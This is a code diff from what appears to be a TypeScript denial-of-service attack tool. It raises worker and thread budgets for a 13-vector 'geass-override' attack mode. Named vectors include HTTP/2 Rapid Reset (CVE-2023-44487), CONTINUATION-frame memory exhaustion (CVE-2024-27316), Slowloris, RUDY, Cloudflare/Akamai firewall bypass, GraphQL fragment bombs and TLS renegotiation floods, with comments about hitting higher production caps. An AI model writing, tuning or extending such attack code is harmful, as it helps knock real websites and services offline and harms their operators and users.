@@ -192,37 +192,42 @@ async function runAttackWorkers(
   // Vector 12: QUIC/HTTP3 Flood        — RFC 9000 DCID exhaustion, crypto state per packet
   // Vector 13: SSL Death Record        — 1-byte TLS records, 40K AES-GCM decrypts/sec on server
   //
-  // Total workers: ~18 — optimized for 8vCPU / 32GB RAM deployment
+  // ★ 32GB RAM / 8 vCPU optimized — worker counts tuned for I/O-bound parallelism.
+  // Most attack vectors are I/O-bound (network + socket), not CPU-bound, so N > 8 workers
+  // is perfectly fine — each worker runs its own event loop and handles thousands of async sockets.
+  // CPU-intensive vectors (H2 RST + PING, TLS Renego RSA, H2 CONTINUATION OOM) get extra workers
+  // to multiply parallelism: 3 workers × 500 H2 sessions = 1500 concurrent RST streams.
   if (method === "geass-override") {
     const connW   = 1;
-    const slowW   = 1;
-    const h2W     = Math.max(2, Math.ceil(CPU_COUNT * 0.25)); // ≥2 — CVE-2023-44487
-    const contW   = Math.max(1, Math.ceil(CPU_COUNT * 0.14)); // ≥1 — CVE-2024-27316
-    const hpackW  = Math.max(1, Math.ceil(CPU_COUNT * 0.12)); // ≥1 — HPACK table eviction
-    const wafW    = Math.max(2, Math.ceil(CPU_COUNT * 0.18)); // ≥2 — CF/Akamai bypass
+    const slowW   = 2;  // 2×: 2 workers × 50K Slowloris = 100K half-open connections
+    const h2W     = Math.max(3, Math.ceil(CPU_COUNT * 0.30));  // ≥3 — CVE-2023-44487 PING+RST dominant
+    const contW   = Math.max(2, Math.ceil(CPU_COUNT * 0.20));  // ≥2 — CVE-2024-27316 OOM (16KB frames)
+    const hpackW  = Math.max(2, Math.ceil(CPU_COUNT * 0.15));  // ≥2 — HPACK table eviction
+    const wafW    = Math.max(2, Math.ceil(CPU_COUNT * 0.20));  // ≥2 — CF/Akamai bypass fingerprint
     const wsW     = 1;
     const gqlW    = 1;
-    const rudyW   = 1;
+    const rudyW   = 2;  // 2×: multipart + classic RUDY
     const cacheW  = 1;
-    const tlsW    = 1;
+    const tlsW    = Math.max(2, Math.ceil(CPU_COUNT * 0.15));  // ≥2 — RSA renegotiation is CPU intensive
     const quicW   = 1;  // QUIC/H3 — UDP single worker
     const sslW    = 1;  // SSL Death Record
 
-    // Thread budget — 8vCPU/32GB optimized (13-vector split)
-    const connT   = Math.max(50,  Math.round(threads * 0.10));
-    const slowT   = Math.max(40,  Math.round(threads * 0.08));
-    const h2T     = Math.max(120, Math.round(threads * 0.25)); // ★ CVE-2023-44487 dominant
-    const contT   = Math.max(80,  Math.round(threads * 0.15)); // ★ CVE-2024-27316 OOM
-    const hpackT  = Math.max(80,  Math.round(threads * 0.12)); // ★ HPACK eviction storm
-    const wafT    = Math.max(100, Math.round(threads * 0.18)); // ★ CF/Akamai bypass
-    const wsT     = Math.max(60,  Math.round(threads * 0.10)); // WS goroutine hold + frames
-    const gqlT    = Math.max(40,  Math.round(threads * 0.08)); // GraphQL fragment CPU
-    const udpT    = Math.max(32,  Math.round(threads * 0.06)); // L4 bandwidth
-    const rudyT   = Math.max(30,  Math.round(threads * 0.06)); // Slow POST thread hold
-    const cacheT  = Math.max(30,  Math.round(threads * 0.06)); // CDN origin miss flood
-    const tlsT    = Math.max(20,  Math.round(threads * 0.05)); // TLS renegotiation
-    const quicT   = Math.max(16,  Math.round(threads * 0.05)); // QUIC/H3 DCID exhaust
-    const sslT    = Math.max(50,  Math.round(threads * 0.08)); // SSL Death Record
+    // Thread budget — 32GB/8vCPU optimized (13-vector split)
+    // Percentages tuned to hit the new higher PROD caps in attack-worker.ts
+    const connT   = Math.max(80,  Math.round(threads * 0.08));
+    const slowT   = Math.max(80,  Math.round(threads * 0.10)); // 2 workers: each handles 50K/2=25K sockets
+    const h2T     = Math.max(200, Math.round(threads * 0.28)); // ★ CVE-2023-44487 + PING dominant
+    const contT   = Math.max(120, Math.round(threads * 0.18)); // ★ CVE-2024-27316 OOM — 16KB frames
+    const hpackT  = Math.max(100, Math.round(threads * 0.14)); // ★ HPACK eviction storm
+    const wafT    = Math.max(120, Math.round(threads * 0.20)); // ★ CF/Akamai WAF bypass
+    const wsT     = Math.max(80,  Math.round(threads * 0.10)); // WS goroutine hold + binary frames
+    const gqlT    = Math.max(50,  Math.round(threads * 0.08)); // GraphQL fragment bomb CPU
+    const udpT    = Math.max(40,  Math.round(threads * 0.06)); // L4 bandwidth saturation
+    const rudyT   = Math.max(60,  Math.round(threads * 0.08)); // Slow POST thread hold × 2 workers
+    const cacheT  = Math.max(50,  Math.round(threads * 0.07)); // CDN origin miss flood
+    const tlsT    = Math.max(40,  Math.round(threads * 0.06)); // RSA renegotiation × 2 workers
+    const quicT   = Math.max(24,  Math.round(threads * 0.05)); // QUIC/H3 DCID exhaust
+    const sslT    = Math.max(60,  Math.round(threads * 0.08)); // SSL Death Record × 1K slots
 
     const geassConnsPerPool = new Map<string, number>();
     const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
